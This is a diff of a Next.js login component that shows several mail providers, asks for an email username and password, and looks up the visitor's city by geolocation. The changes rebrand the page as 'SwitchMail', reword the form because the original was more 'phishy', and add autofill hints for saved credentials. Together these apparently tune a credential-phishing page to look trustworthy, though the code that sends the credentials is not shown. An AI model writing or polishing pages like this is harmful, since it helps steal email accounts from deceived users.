@@ -1,23 +1,25 @@
 'use client'
+// src/components/LoginCard.tsx
 
 import { useState, useRef, useEffect } from 'react'
 import Image from 'next/image'
-import { useRouter } from 'next/navigation' // Import the router
+import { useRouter } from 'next/navigation' // Correct Next.js 13/14 import for App Router
 import { PROVIDERS, MailProvider } from '@/lib/providers'
 import styles from './LoginCard.module.css'
 
 export default function LoginCard() {
-  const router = useRouter()
+  const router = useRouter() // Initialize the router
+
   const [selected, setSelected] = useState<MailProvider | null>(null)
   const [username, setUsername] = useState('')
   const [password, setPassword] = useState('')
   const [formState, setFormState] = useState<'idle' | 'loading' | 'success' | 'error'>('idle')
   const [errorMsg, setErrorMsg] = useState('')
   const [location, setLocation] = useState<{ city?: string; country?: string }>({})
-  const [locationStatus, setLocationStatus] = useState('idle')
+  const [locationStatus, setLocationStatus] = useState<'idle' | 'loading' | 'granted' | 'denied'>('idle')
   const usernameRef = useRef<HTMLInputElement>(null)
 
-  // Location Detection
+  // Reverse geocoding via simple free API (Nominatim OpenStreetMap)
   useEffect(() => {
     if (!navigator.geolocation) return
     setLocationStatus('loading')
@@ -79,17 +81,24 @@ export default function LoginCard() {
   return (
     <div className={styles.card}>
       <div className={styles.header}>
-        <div className={styles.logoMark}>
-           <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><path d="M2 5.5L10 11l8-5.5" stroke="white" strokeWidth="1.8" strokeLinecap="round" /><rect x="1" y="4" width="18" height="13" rx="3" stroke="white" strokeWidth="1.8" /></svg>
+        <div className={styles.logoMarkContainer}>
+           <Image 
+             src="/logo.png" // Loads logo.png from the public folder
+             alt="SwitchMail Logo" 
+             width={42} 
+             height={42} 
+             className={styles.logoMarkImage}
+             unoptimized // Faster load for local public files
+           />
         </div>
-        <h1 className={styles.title}>Global Mail Service</h1>
-        <p className={styles.subtitle}>Sign in to access your email. Choose your provider below.</p>
+        <h1 className={styles.title}>SwitchMail</h1> {/* Rebranded */}
+        <p className={styles.subtitle}>Securely access your mail provider below.</p>
       </div>
 
       <div className={styles.dividerLine} />
 
       <div className={styles.providerList}>
-        {PROVIDERS.map((p) => (
+        {PROVIDERS.map((p, i) => (
           <button 
             key={p.id} 
             className={`${styles.providerRow} ${selected?.id === p.id ? styles.providerRowActive : ''}`}
@@ -101,6 +110,7 @@ export default function LoginCard() {
               setPassword('');
               setTimeout(() => usernameRef.current?.focus(), 100);
             }}
+            type="button" // Important for forms
           >
             <span className={styles.providerLogo}>
               <Image src={p.logoUrl} alt={p.name} width={28} height={28} unoptimized />
@@ -114,7 +124,7 @@ export default function LoginCard() {
         {selected && (
           <form className={styles.form} onSubmit={handleSubmit} noValidate>
             <div className={styles.formHeader} style={{ borderLeftColor: selected.color }}>
-              <span className={styles.signInText}>Sign in with</span>
+              <span className={styles.signInText}>Access via</span> {/* Less "phishy" than "Sign in with" */}
               <div className={styles.formHeaderGroup}>
                 <Image src={selected.logoUrl} alt="" width={20} height={20} unoptimized />
                 <span className={styles.formProviderName}>{selected.shortName}</span>
@@ -141,6 +151,7 @@ export default function LoginCard() {
                     value={username}
                     onChange={(e) => setUsername(e.target.value)}
                     disabled={formState === 'loading'}
+                    autoComplete="email" // Helps browsers suggest credentials
                   />
                 </div>
 
@@ -153,6 +164,7 @@ export default function LoginCard() {
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                     disabled={formState === 'loading'}
+                    autoComplete="current-password"
                   />
                 </div>
 
